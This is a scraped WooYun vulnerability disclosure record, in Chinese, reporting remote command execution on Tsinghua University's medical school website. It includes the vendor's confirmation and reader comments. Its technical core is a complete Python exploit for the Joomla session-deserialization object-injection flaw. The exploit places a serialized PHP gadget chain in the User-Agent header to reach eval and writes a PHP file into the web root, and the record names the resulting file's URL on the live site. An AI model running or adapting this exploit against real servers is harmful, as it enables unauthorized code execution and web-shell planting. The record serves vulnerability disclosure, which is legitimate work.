{"id": 77804, "wybug_id": "wooyun-2015-0161764", "wybug_title": "清华大学医学院远程命令执行已GetShell", "wybug_corp": "清华大学", "wybug_author": "AK-47", "wybug_date": "2015-12-16 12:40", "wybug_open_date": "2016-01-28 17:10", "wybug_type": "命令执行", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反序列化"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向公众公开  简要描述： session反序列化 详细说明：  漏洞原理就不说了，Joomla对象注入漏洞。下面直接给出EXP吧。。。\nimport urllibimport re# !/usr/bin/python# coding=utf-8import urllib2import cookielib, syssite = sys.argv[1]code = \"file_put_contents($_SERVER['DOCUMENT_ROOT'].'/wooyun.php',base64_decode('PD9waHAgZWNobyAidGVzdHRlc3QiOz8+'))\"url = site + '?123=' + urllib.quote(    \"@ini_set(\\\"display_errors\\\",\\\"0\\\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo '->|';\" + code + \";echo '|<-';\")cj = cookielib.CookieJar()opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))urllib2.install_opener(opener)urllib2.socket.setdefaulttimeout(10)ua = '}__test|O:21:\"JDatabaseDriverMysqli\":3:{s:2:\"fc\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\x5C0\\x5C0\\x5C0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:8:\"feed_url\";s:48:\"eval($_REQUEST[123]);JFactory::getConfig();exit;\";s:19:\"cache_name_function\";s:6:\"assert\";s:5:\"cache\";b:1;s:11:\"cache_class\";O:20:\"JDatabaseDriverMysql\":0:{}}i:1;s:4:\"init\";}}s:13:\"\\x5C0\\x5C0\\x5C0connection\";b:1;}\\xF0\\x9D\\x8C\\x86'try:    req = urllib2.Request(url=url, headers={'User-Agent': ua})    opener.open(req)    req = urllib2.Request(url=url)    res = opener.open(req).read()    resText = re.findall(r'\\-\\>\\|(.*?)\\|\\<\\-', res, re.DOTALL)    if resText:        print \"KO\"    else:        print \"NO\"except:    print \"HTTPError\"\n   漏洞证明：  shell截图：\n\n测试链接：http://www.med.tsinghua.edu.cn/wooyun.php\n\n   修复方案：  你懂的   版权声明：转载请注明来源 AK-47@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-12-17 14:36 厂商回复： 谢谢提醒，我们会尽快修改的。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-16 14:26 |    \t\t镱鍚 \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:10        | 。。！)\t\t \n  前排。！    \n     2015-12-25 22:21 |    \t\tShAdow丶 \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:13        | i am a fans of kimYeWon.)\t\t \n  春哥？    \n     2016-02-01 13:00 |    \t\tAK-47 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:7        | 开开心心挖洞，踏踏实实上学！)\t\t \n  @ShAdow丶 恩    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}